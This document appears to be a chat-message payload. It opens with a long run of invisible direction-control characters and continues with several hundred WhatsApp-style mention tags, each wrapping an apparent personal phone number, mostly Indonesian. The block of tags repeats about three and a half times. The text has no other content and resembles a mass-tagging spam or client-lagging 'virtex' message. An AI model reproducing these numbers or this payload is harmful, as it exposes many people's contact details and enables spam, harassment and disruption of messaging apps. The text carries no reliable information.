‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ 